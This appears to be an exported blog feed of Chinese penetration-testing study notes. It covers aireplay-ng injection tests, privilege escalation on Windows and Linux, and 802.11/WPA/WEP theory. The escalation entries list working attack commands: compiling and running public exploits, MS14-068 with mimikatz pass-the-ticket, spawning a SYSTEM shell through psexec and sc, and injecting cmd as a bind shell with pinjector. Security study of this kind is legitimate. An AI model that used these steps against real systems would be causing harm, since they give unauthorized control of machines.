没有修正方法,此时可以启动多个aireplay-ng命令提高速度<br>    使用-h参数指定注入MAC地址与网卡MAC地址不一致报错<br>        建议保持一致(macchange)</p><p>AIREPLAY-NG包注入测试<br>    检测网卡是否可以注入包<br>    检测AP的响应时间<br>        回包率反应链路质量<br>    如果有两个无线网卡,可以检测具体可以注入哪种攻击<br>    基本测试检测AP对probe广播的响应<br>        向每AP发30包<br>        网卡成功发送并可接收包的能力<br>    基本测试<br>        <code>aireplay -9 wlan2mon</code><br>    向隐藏AP/指定SSID注入<br>        <code>aireplay-ng -9 -e leven -a EC:26:CA:FA:03:DC wlan2mon</code><br>    card to card 注入测试    #网卡到网卡<br>        <code>aireplay-ng -9 -i wlan0mon wlan2mon</code><br>        具体攻击方式<br>        -i 作为AP的网卡<br>        5/7 Faild<br>            注入MAC和真实MAC<br>            相同时可以正常使用</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Aircrack-ng </tag>
            
            <tag> 无线抓包 </tag>
            
            <tag> 无线破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用漏洞和程序配置不当提权</title>
      <link href="/2013/06/06/pentest/%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/"/>
      <url>/2013/06/06/pentest/%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="利用漏洞提权windows"><a href="#利用漏洞提权windows" class="headerlink" title="利用漏洞提权windows"></a><strong>利用漏洞提权windows</strong></h3></blockquote><p><code>Ms11-080</code>        #此漏洞在中文版的系统中利用是DOS拒绝服务的攻击效果,而非提权</p><pre><code>Kb2592799    https://technet.microsoft.com/library/sevurity/ms11-080searchsploit Ms11-080exploits/windows/local/18176.py    Pyinstaller        #将python脚本编译为EXE需要用到的包    https://pypi.python.org/pypi/PyInstaller/2.1Pywin32            #将python脚本编译为EXE需要用到的扩展    http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/python pyinstaller.py --onefile 18176.py #将18176.py编译为exe可执行程序    MS11-046        #拒绝服务漏洞    DoSMs14-068        #普通用户提权到域服务器管理库    https://github.com/bidord/pykekms14-068.py -u user@lab.com -s userSID -d dc.lab.com拷贝 TGT_user1@lab.com.ccache 到windows系统本地管理员登录    mimikatz.exe log &quot;kerberos::ptc TGT_user@lab.com.ccache&quot; exit    dsa.msc        #域控制器管理</code></pre><blockquote><h3 id="利用漏洞提权linux"><a href="#利用漏洞提权linux" class="headerlink" title="利用漏洞提权linux"></a><strong>利用漏洞提权linux</strong></h3></blockquote><pre><code>Ubuntu 11.10    http://old-releases.ubuntu.com/releases/11.10gcc    sudo mount /dev/cdrom /media/cdrom    #挂载镜像    sudo apt-cdrom add &amp;&amp; sudo apt-get install gcc    #把镜像加入安装源并安装GCC    gcc 18411.c -o expCVE-2012-0056    /proc/pid/mem    kernels&gt;=2.6.39    http://blog.zx2c4.com/749    scp /usr/share/exploitdb/platforms/linux/local/18411.c cat@192.168.1.118:/home/cat/        将利用脚本拷贝到目标机器</code></pre><blockquote><h3 id="利用配置不当提权"><a href="#利用配置不当提权" class="headerlink" title="利用配置不当提权"></a><strong>利用配置不当提权</strong></h3></blockquote><p>与系统漏洞提权相比,更常用的方法<br>企业环境<br>补丁更新的全部已经安装<br>输入变量过滤之外更值得研发关注的安全隐患<br>以system权限启动<br>NTFS权限允许users修改删除</p><p><code>icacls</code><br>    <code>icacls c:\windows\*.exe /save perm /T</code>    #快速查找windows系统中所有NTFS权限配置不当的程序<br>    <code>i586-mingw32msvc-gcc -o admin.exe admin.c</code>    #快速查找linux系统中所有NTFS权限配置不当的程序<br><code>Find</code><br>    <code>find / -perm 777 -exec ls -l {} \;</code></p><p>应用系统的配置文件<br>    应用连接数据库的配置文件<br>    后台服务运行账号</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 权限维持 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mimikatz </tag>
            
            <tag> 漏洞提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地提权常见手法</title>
      <link href="/2013/06/03/pentest/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/"/>
      <url>/2013/06/03/pentest/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h3 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h3><p>已实现本地低权限账号登录<br>    远程溢出<br>    直接获得账号密码<br>希望获取更高权限<br>    实现对目标进一步控制<br>系统账号之间权限隔离<br>    操作系统安全的基础<br>    用户空间<br>    内核空间<br>系统账号<br>    用户账号登录时获取权限令牌<br>    服务账号无需用户登录已在后台启动服务</p><h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h5><pre><code>userAdministratorSystem    net user owl *        #修改密码    net user    #查看用户账号</code></pre><h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><strong>Linux</strong></h5><pre><code>userRoot</code></pre><blockquote><h4 id="Administrator提权为SYSTEM"><a href="#Administrator提权为SYSTEM" class="headerlink" title="Administrator提权为SYSTEM"></a>Administrator提权为SYSTEM</h4></blockquote><p>Windows system账号<br>    系统设置管理功能<br>    SysInternal Suite<br>        <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/</a></p><pre><code>psexec -i -s -d taskmgrat 19:39 /interactive cmd    #win10已弃用at,改用sc和schtaskssc Create syscmd binPath=&quot;cmd /K start&quot; type=own type=interactsc start syscmd</code></pre><blockquote><h4 id="注入进程提权"><a href="#注入进程提权" class="headerlink" title="注入进程提权"></a>注入进程提权</h4></blockquote><pre><code>隐蔽痕迹pinjector.exe    http://www.tarasco.org/security/Process_Injector/pinjector.exe -l    #查看可注入进程pinjecter.exe -p 3012 cmd 6666 #将CMD注入到PID为3012的进程,并开放端口6666</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 权限维持 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
            <tag> pinjector </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线加密技术WPA安全系统</title>
      <link href="/2013/05/28/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/WPA%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/"/>
      <url>/2013/05/28/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/WPA%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h4 id="WPA安全系统"><a href="#WPA安全系统" class="headerlink" title="WPA安全系统"></a><strong>WPA安全系统</strong></h4><p>Wi-Fi Protected Access<br>    802.11i 组为提高无线安全,开发两个新的链路层加密协议<br>        Temporal Key Integrity Protocol(TKIP)<br>            WPA1(较之WEP可动态改变密钥)<br>        Counter Mode with CBC-MAC(CCMP)<br>            WPA2<br>    WPA加密两种安全类型<br>        WPA个人:使用预设共享密钥实现身份验证<br>        WPA企业:使用802.1X和Radius服务器实现AAA(认证协议框架EAP)</p><h4 id="WPA1"><a href="#WPA1" class="headerlink" title="WPA1"></a><strong>WPA1</strong></h4><p>802.11i 第三版草案<br>    与WEP比较<br>        都采用逐包进行密钥加密<br>        128位的key和48位的初向量(IV)<br>        RC4流加密数据<br>        帧计数器避免重放攻击<br>        TKIP使用Michael算法进行完整性校验(MIC)<br>            WEP 使用CRC32进行MIC<br>        兼容早期版本硬件</p><h4 id="WPA2"><a href="#WPA2" class="headerlink" title="WPA2"></a><strong>WPA2</strong></h4><p>依据802.11i 完全重新设计实现<br>        也被称为Robust Security Network(RSN)<br>        CCMP替代TKIP<br>        AES加密算法取代了RC4<br>        不兼容早期版本硬件</p><h4 id="WPA企业连接过程"><a href="#WPA企业连接过程" class="headerlink" title="WPA企业连接过程"></a><strong>WPA企业连接过程</strong></h4><ul><li>协商安全协议</li><li>身份认证</li><li>密钥分发和验证</li><li>数据加密完整性</li></ul><h4 id="WPA-PSK"><a href="#WPA-PSK" class="headerlink" title="WPA-PSK"></a><strong>WPA-PSK</strong></h4><ul><li>协商安全协议</li><li>密钥分发和验证</li><li>数据加密完整性</li></ul><h4 id="协商安全协议"><a href="#协商安全协议" class="headerlink" title="协商安全协议"></a><strong>协商安全协议</strong></h4><p>协商认证方式<br>        PSK / 802.1X<br>    单播和组播/广播流量加密套件<br>        TKIP / CCMP<br>    STA通过probe获取无线网络信息<br>        速率<br>        加密<br>        通道<br>        名称</p><h4 id="身份认证-WPA企业"><a href="#身份认证-WPA企业" class="headerlink" title="身份认证(WPA企业)"></a><strong>身份认证(WPA企业)</strong></h4><p>身份认证基于Extensible Authentication Protocol(EAP)实现<br>        EAP-TLS,需要客户端和服务器证书<br>        EAP-TTLS<br>        PEAP混合身份验证,只需要服务器证书<br>    客户端选择身份认证方式<br>    AP发送身份验证信息给Radius Server,<br>    Radius Server返回”Radius Accept”报时认证成功<br>        其中包含Master Key(MK)<br>    AP通过EAP消息通知STA认证成功</p><h4 id="密钥交换"><a href="#密钥交换" class="headerlink" title="密钥交换"></a><strong>密钥交换</strong></h4><p>无线网络设计用于一组无线设备通信<br>        关联到同一AP的设备共享无线信道<br>        单播,广播,组播<br>            安全特性要求不同<br>            单播通信需要单独密钥加密通信双方流量<br>            pairwise key:对偶临时密钥(PIK)<br>            组播通信需要信任域内所有成员共享的同一密钥<br>            group key:组临时密钥(GTK)</p><p><strong>PMK</strong><br>安全上下文的顶级密钥<br>        MK进行TLS-PRF加密得出PMK<br>    基于服务密钥<br>        由上层身份验证方法服务器生成<br>        从服务器通过 radius传给AP<br>        从AP通过EAP消息传给所有STA<br>    基于PSK共享密钥<br>        Essid+PSK+迭代次数4096—-Hash计算生成<br>        STA和AP分别计算得出PMK,并不在网络中传递交换<br>    256位即32字节</p><h4 id="PTK的生成过程"><a href="#PTK的生成过程" class="headerlink" title="PTK的生成过程"></a><strong>PTK的生成过程</strong></h4><ul><li>HMAC-SHA1散列算法</li><li>PRF-X散列算法</li></ul><h5 id="四步握手过程生成PTK"><a href="#四步握手过程生成PTK" class="headerlink" title="四步握手过程生成PTK"></a><strong>四步握手过程生成PTK</strong></h5><ul><li>AP发送Anonce给STA</li><li>STA生成Snonce计算出PTK</li><li>Snonce加PTK的MIC发给AP</li><li>AP拿到Snonce计算出PTK</li><li>AP计算MIC与接收的MIC比对</li><li>MIC一致说明确定STA知道PMK<br>  AP发GTK给STA<br>  STA回复ACK并使用密钥加密</li></ul><p>数据加密和完整性<br>    三种算法<br>        Temporal Key Integrity Protocol(TKIP)4<br>        Counter Mode with CBC-MAC(CCMP)5<br>        Wireless Robust Authenticated Protocol(WRAP)6</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线技术理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 无线加密 </tag>
            
            <tag> WPA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEP加密及RC4算法</title>
      <link href="/2013/05/28/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/WEP%E5%8A%A0%E5%AF%86-RC4%E7%AE%97%E6%B3%95/"/>
      <url>/2013/05/28/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/WEP%E5%8A%A0%E5%AF%86-RC4%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<blockquote><h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a><strong>加密</strong></h4><p>无线安全根源<br>    802.11基于无线电波发射信息<br>    嗅探侦听是主要问题<br>    加密机制是必须手段<br>Wired Equivalent Privacy(WEP)<br>    802.11标准的一部分<br>    发布后不久被发现存在安全漏洞<br>Wi-Fi Protected Access(WPA)取代WEP<br>    WPA2(802.11i 标准)</p></blockquote><h4 id="OPEN无加密网络"><a href="#OPEN无加密网络" class="headerlink" title="OPEN无加密网络"></a><strong>OPEN无加密网络</strong></h4><p>无任何加密机制<br>    所有数据都可以被嗅探<br>    STA和AP只协商拼配参数即可连入网络        </p><h4 id="WEP加密"><a href="#WEP加密" class="headerlink" title="WEP加密"></a><strong>WEP加密</strong></h4><p>使用Rivest Cipher 4(RC4)算法加密流量内容,实现机密性<br>    CRC32算法检查数据完整性<br>    标准采用使用24位initialization vector(IV)<br>    受美国加密技术出口限制法律的要求<br>        高于64bit key禁止出口<br>        所以除24bit IV之外真实的key只有40bit的版本被允许出口<br>        出口限制法律撤销后实现了128bit key的WEP版本(使用相同的24bit IV)</p><h4 id="RC4算法"><a href="#RC4算法" class="headerlink" title="RC4算法"></a><strong>RC4算法</strong></h4><p>RSA实验室研发的对称加密流算法<br>        实现简单<br>        速度快<br>    加密:对明文流和密钥流进行XOR计算(XOR:二进制异或运算)<br>    解密:对密文流和密钥流进行XOR计算<br>    RC4算法key由两个过程生成<br>        合并IV和PSK,利用Key Scheduling Algorithm(KSA)算法生成起始状态表<br>        Pseudo-Random Generation Algorithm(PRGA)算法生成最终密钥流<br>RC4算法加密流程<br>RC4算法解密流程</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线技术理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 无线加密 </tag>
            
            <tag> RC4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线通信技术Radiotap Head原理</title>
      <link href="/2013/05/27/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/RADIOTAP%E5%A4%B4%E9%83%A8/"/>
      <url>/2013/05/27/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/RADIOTAP%E5%A4%B4%E9%83%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="Radiotap-Head"><a href="#Radiotap-Head" class="headerlink" title="Radiotap Head"></a><strong>Radiotap Head</strong></h4><p>802.11侦发射和接收的事实标准,802.11依赖Radiotap完成通信过程<br>Linux系统在驱动和API中内建支持Radiotap<br>802.11帧发射之前,网卡驱动在802.11头前面添加Radiotap头,反之当网卡接收到无线帧时,驱动通知MAC层,此帧头包含Radiotap头<br>Radiotap为802.11帧传递额外信息,厂家可自定义,因此头长度不固定<br>不破坏原始头结构,增加传递的信息</p><h4 id="分为Header和data"><a href="#分为Header和data" class="headerlink" title="分为Header和data"></a><strong>分为Header和data</strong></h4><p>Version(8bit)<br>    值始终为0<br>Pad(8bit)<br>    未使用,只作为字段强制对其占位；<br>Length(16bit)<br>    整个radiotap头长度(可变),作用是确定802.11头的开始位置<br>Present(32bit)<br>    Data段的掩码<br>    Ext(1,0)<br>    MAC不能理解的头部直接忽略</p><h4 id="802-11头部信息"><a href="#802-11头部信息" class="headerlink" title="802.11头部信息"></a><strong>802.11头部信息</strong></h4><p>DU(Data Unit)即数据单元,信息传输的最小数据集合<br>    传递过程逐层封装(Encapsulation)<br>    SDU(Service Data Unit) /PDU(Protocol Data Unit)<br>    MSDU–&gt;MIC–&gt;分帧–&gt;添加IV–&gt;加密–&gt;添加MAC头部–&gt;MPDU<br>    MPDU/PSDU+物理头=PPDU–&gt;RF发射</p><h4 id="802-11-MAC头结构"><a href="#802-11-MAC头结构" class="headerlink" title="802.11 MAC头结构"></a><strong>802.11 MAC头结构</strong></h4><p>Frame Control<br>    Protocol Version(2bit)    :802.11协议版本,始终为0,1,2,3<br>    Type(2bit)    :规定帧的具体用途(3种帧类型)<br>        控制帧(1)<br>        数据帧(2)<br>        管理帧(0)<br>    SubType(4bit)<br>        每个类型对应多个子类型,协议规定不同类型/子类型的帧完成不同功能的操作<br>    To DS/From (1/1bit)<br>        标识帧的传输方向,传向DS或者来自DS；这两个字段的值决定着MAC头中4个Adddress字段的不同定义.<br>    0x00:出现在IBSS环境中(可能是Management帧或者是Control帧类型)；或者是STSL(Stantion to Station Link)中两个STA间通信,这种情况下通信不通过AP；<br>    0x01:表示Data帧从AP向STA传递;<br>    0x02:表示Data帧从Sta向AP传递;<br>    0x03:表示两个AP间通信,这是典型的WDS(Wireless Distribution System)环境下AP间的通信,或者表示Mesh环境下MP间的通信；只有此时才会使用到Address4字段；    </p><p>More frag(1bit):表示是否还有后续帧<br>        值为1时表示有后续分段,可能是Data或Management帧类型.只有单播接收地址的帧会被分段；<br>    Retry(1bit):重传<br>        值为1表示重传帧,可能是Data或Management帧类型,接收端进程使用此值防止帧重复；<br>    Power Mgmt(1bit):活动模式(0)/省电模式(1)<br>        STA处于省电模式时,向关联的AP发送该值为1的帧(AP从不使用此字段),省电模式下STA不接收数据,发送给它的Data帧由AP暂时缓存；<br>    More Data(1bit)<br>        当AP缓存了至少一个MSDU时,会向省电模式的STA发送该值为1的帧,表示有数据要传输给STA,接收到此帧的STA唤醒自己并向AP发送PS-Poll帧,<br>        取回由AP为其缓存的数据.也被用于AP有更多的广播/多播帧需要发送的情况；<br>    Protected Frame(1bit)<br>        可能是Data或Management帧类型,表示MSDU是否被加密；也被用于表示PSK身份验证Frame#3帧;数据载荷为空时,该字段值为0；<br>    Order(1bit)<br>        在非QoS帧的情况下,值为1表示数据必须按严格顺序处理,通常为0；</p><h4 id="Duration-ID-16bit"><a href="#Duration-ID-16bit" class="headerlink" title="Duration/ID(16bit)"></a><strong>Duration/ID(16bit)</strong></h4><p>所有Control帧都使用该字段,其作用随Type/SubType变化有所不同；<br>    帧类型为PS Poll(type:1,subtype:10)时,表示STA关联的AIP(association identity);<br>    其他情况下该字段作为一种载波侦听机制,表示接收下一帧之前需要保持的时间间隔,用于NAV(Network Allocation Vector)计算,单位是微秒；</p><h4 id="MAC-Layer-Address"><a href="#MAC-Layer-Address" class="headerlink" title="MAC Layer Address"></a><strong>MAC Layer Address</strong></h4><p>前面已经提到了4种,这里补充最后一种:Basic service set ID(BSSID); 它是BSS的2层唯一标识,Infrastructure模式中BSSID就是AP的MAC地址,当AP支持多BSS时,随机生成每个BSSID；</p><h4 id="Sequence-Control-16bit"><a href="#Sequence-Control-16bit" class="headerlink" title="Sequence Control(16bit)"></a><strong>Sequence Control(16bit)</strong></h4><p>这个字段包含两个子字段:Sequence Number和Fragment Number;<br>    Sequence Number是每个帧的编号,数值范围是0–4095,以1为步长递增.当帧被分段时,同一帧中不同分段的Sequence Number相同；<br>    Fragment Number是被分段的帧用于标识分段位置顺序的编号,数值范围是0–15,以1为步长递增；</p><h4 id="DATA部分"><a href="#DATA部分" class="headerlink" title="DATA部分"></a><strong>DATA部分</strong></h4><p>Frame Body(变长)<br>    数据字段,未加密的最大MSDU长度为2304字节(其中包含最大256字节的上层头信息,和可被传递的数据2048字节).<br>    不同的加密方法会增加一定的内容长度；<br>    WEP:8 bytes–&gt;2312bytes<br>    TKIP(WPA1):20bytes–&gt;2324bytes<br>    CCMP(WPA2):16bytes–&gt;2320bytes<br>    注:Control类型的帧没有Frame Body内容.</p><h4 id="FCS-32bit"><a href="#FCS-32bit" class="headerlink" title="FCS(32bit)"></a><strong>FCS(32bit)</strong></h4><p>发送端对全部MAC包头和Frame Body内容进行CRC计算,计算结果即为FCS(Frame Check Sequence)值,接收端进行同样的计算,结果一致时,<br>    则接收端向发送端返回ACK,否则丢弃帧(只对单播帧有效,FCS错误的广播/多播帧可能被接收)<br>    注:wireshark抓包时已经删除了FCS值</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线技术理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 802.11 </tag>
            
            <tag> 无线数据帧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux无线协议栈及配置命令</title>
      <link href="/2013/05/27/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/"/>
      <url>/2013/05/27/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Linux%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%8F%8A%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h4 id="802-11协议栈"><a href="#802-11协议栈" class="headerlink" title="802.11协议栈"></a><strong>802.11协议栈</strong></h4><p>leee 80211<br>    iwconfig<br>    iwlist<br>mac80211<br>    iw</p><h4 id="查看无线网卡"><a href="#查看无线网卡" class="headerlink" title="查看无线网卡"></a><strong>查看无线网卡</strong></h4><pre><code>ifconfigiwconfigiw list</code></pre><h4 id="信道频率"><a href="#信道频率" class="headerlink" title="信道频率"></a><strong>信道频率</strong></h4><pre><code>iwlist wlan2 frequencyiw list</code></pre><h4 id="扫描附近AP"><a href="#扫描附近AP" class="headerlink" title="扫描附近AP"></a><strong>扫描附近AP</strong></h4><pre><code>iw dev wlan2 scan | grep SSIDiw dev wlan2 scan | egrep &quot;DS\ Parameter\ set | SSID&quot;    #扫描查看附近AP信道iwlist wlan2 scanning | egrep &quot;ESSID | Channel&quot;            #扫描查看附近AP信道及频宽</code></pre><p>log(signal/1mW)        #singnal无线强度接收值计算,0~-50 信号好,超过-130信号不可达</p><h4 id="添加删除侦听端口"><a href="#添加删除侦听端口" class="headerlink" title="添加删除侦听端口"></a><strong>添加删除侦听端口</strong></h4><pre><code>iw dev wlan2 interface add wlan2mon type monitor    #把无线网卡设置成monitor模式,进行无线数据抓包tcpdump -s 0 --i wlan2mon -p                    #tcpdump命令行抓包工具ifconfig wlan2mon up            #把wlan2mon设置成up状态service network-manager stop    #如果up不成功,停用network-manager服务service network-manager status    #network-manager服务状态查询vi ./bashrc                        #服务启动项配置iw dev wlan2mon interface del</code></pre><h5 id="802-11"><a href="#802-11" class="headerlink" title="802.11"></a><strong>802.11</strong></h5><p>协议栈<br>    <a href="https://www.kernel.org/doc/htmldocs/80211/index.html" target="_blank" rel="noopener">https://www.kernel.org/doc/htmldocs/80211/index.html</a><br>无线驱动<br>    <a href="http://linuxwireless.org/en/users/Drivers/" target="_blank" rel="noopener">http://linuxwireless.org/en/users/Drivers/</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线技术理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 802.11 </tag>
            
            <tag> 无线协议 </tag>
            
            <tag> Monitor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线数据帧Management Frame原理</title>
      <link href="/2013/05/26/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Management%20Frame/"/>
      <url>/2013/05/26/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Management%20Frame/</url>
      
        <content type="html"><![CDATA[<h4 id="Management-Frame-管理帧"><a href="#Management-Frame-管理帧" class="headerlink" title="Management Frame(管理帧)"></a><strong>Management Frame(管理帧)</strong></h4><p>用于协商和控制STA与AP之间的关系</p><h4 id="Beacon-Frames-是由AP发出来的帧"><a href="#Beacon-Frames-是由AP发出来的帧" class="headerlink" title="Beacon Frames(是由AP发出来的帧)"></a><strong>Beacon Frames(是由AP发出来的帧)</strong></h4><p>AP发送的广播帧,通告无线网络的存在(BSSID)<br>发包频率<br>    102.4ms(可变)<br>    时间单位1024microsecond(60秒)<br><strong>SSID网络名</strong><br>隐藏AP不发SSID广播<br><strong>IBSSI Status</strong></p><ul><li>0:intrastructure</li><li>1:ad-hcc<br>Privicy</li><li>WEP\WPA加密<br>ESSID</li><li>名称,长度<br>速率</li><li>802.11 g(1–54Mbit)<br>信道</li><li>11</li></ul><h4 id="Probe-Request-Frames-由STA发出的扫描请求帧"><a href="#Probe-Request-Frames-由STA发出的扫描请求帧" class="headerlink" title="Probe Request Frames(由STA发出的扫描请求帧)"></a><strong>Probe Request Frames(由STA发出的扫描请求帧)</strong></h4><p>用于STA扫描现有AP<br>    发现连接过的AP<br>    发现未连接过的AP</p><h4 id="Probe-Response-Frames-由AP返回的响应帧"><a href="#Probe-Response-Frames-由AP返回的响应帧" class="headerlink" title="Probe Response Frames(由AP返回的响应帧)"></a><strong>Probe Response Frames(由AP返回的响应帧)</strong></h4><p>发现连接过的AP时,速率和ESSID相同的AP响应</p><h4 id="Authentication-Frames-身份认证"><a href="#Authentication-Frames-身份认证" class="headerlink" title="Authentication Frames(身份认证)"></a><strong>Authentication Frames(身份认证)</strong></h4><p>Authentication Algorithm身份认证类型<br>0:开放系统身份验证<br>1:共享密钥身份验证<br>身份认证由多个帧交换过程组成<br>Authentication Seq<br>    每次身份验证过程Seq唯一<br>    1-65535<br>Challenge text<br>    只有共享密钥方式才有此字段<br>Status Code:成功/失败</p><h4 id="Association-Reassociation-Frames-关联-重关联帧"><a href="#Association-Reassociation-Frames-关联-重关联帧" class="headerlink" title="Association/Reassociation Frames(关联/重关联帧)"></a><strong>Association/Reassociation Frames(关联/重关联帧)</strong></h4><p>身份验证成功后,STA执行关联操作,加入无线网络<br>    Association Request    Frames<br>    Reassociation Request Frames<br>    Association Response Frames</p><h4 id="isassociation-Deauthentication-由AP发出"><a href="#isassociation-Deauthentication-由AP发出" class="headerlink" title="isassociation/Deauthentication(由AP发出)"></a><strong>isassociation/Deauthentication(由AP发出)</strong></h4><p>由AP发出<br>    2个字节</p><h4 id="ATIM-Frames"><a href="#ATIM-Frames" class="headerlink" title="ATIM Frames"></a><strong>ATIM Frames</strong></h4><p>只在ad-hoc网络下使用<br>    STA使用此帧通知接收者其有缓存的数据要发送</p><h4 id="Data-Frames-数据帧"><a href="#Data-Frames-数据帧" class="headerlink" title="Data Frames(数据帧)"></a><strong>Data Frames(数据帧)</strong></h4><p>传输用户数据<br>    DATA Frame</p><h4 id="空数据帧"><a href="#空数据帧" class="headerlink" title="空数据帧"></a><strong>空数据帧</strong></h4><p>Null data frame<br>只包含MAC头和FCS<br>STA用于声明自己将要进入省电模式</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 无线渗透 </category>
          
          <category> 无线技术理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 无线数据帧 </tag>
            
            <tag> 管理帧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线数据帧Control Frame原理</title>
      <link href="/2013/05/26/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Control%20Frame/"/>
      <url>/2013/05/26/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/Control%20Frame/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="Control-Frame-控制帧"><a href="#Control-Frame-控制帧" class="headerlink" title="Control Frame(控制帧)"></a>Control Frame(控制帧)</h3><p>控制帧是一些通知设备开始,停止传输或连接失败等情况的短消息;</p></blockquote><h4 id="ACK"><a href="#ACK" class="headerlink" title="ACK"></a><strong>ACK</strong></h4><p>接收端正确接收数据之后向发送端返回ACK确认<br>每个单播帧需要ACK立刻确认<br>    组播和广播不需要ACK确认<br>尽快响应<br>    由硬件完成,而非驱动层<br>T/S:1/13</p><h4 id="PS-POLL"><a href="#PS-POLL" class="headerlink" title="PS-POLL"></a><strong>PS-POLL</strong></h4><p>RF系统的放大器<br>    主要耗电的组件<br>    发射前放大信号,接收并放大还原信号<br>省电模式<br>    关闭信号发射器节省电源耗电(几乎完全关闭)</p><h4 id="AID—-Association-ID"><a href="#AID—-Association-ID" class="headerlink" title="AID—-Association ID"></a><strong>AID—-Association ID</strong></h4><p>STA省电模式唤醒<br>    数据发送至AP(AP缓存数据包)<br>    通过Beacon发送TIM(traffic indication map)<br>        其中包含AID<br>    STA对比AID后唤醒网卡<br>    STA发送PS-Poll帧,请求从AP缓存中取回数据<br>        每个帧都需要ACK确认<br>        ACK确认完后AP从缓存中删除数据帧<br>        传输过程中STA保持唤醒状态<br>        传输结束后STA恢复省电状态</p><h4 id="AP接收PS-Poll帧"><a href="#AP接收PS-Poll帧" class="headerlink" title="AP接收PS-Poll帧"></a><strong>AP接收PS-Poll帧</strong></h4><p>立刻响应<br>延迟响应<br>    简单响应帧</p><ul><li>AID:关联ID</li><li>BSSID:STA正关联的AP地址</li><li>TA:发送此帧的STA地址</li></ul><h4 id="RTS-CTS"><a href="#RTS-CTS" class="headerlink" title="RTS/CTS"></a><strong>RTS/CTS</strong></h4><p>RTS/CTS是CSMA/CA方法的一种补充手段<br>    降低冲突产生的可能性<br>    正式通信之前通过请求应答机制,确信通信介质的可用性<br>    并锁定传输介质和预约通信时间<br>    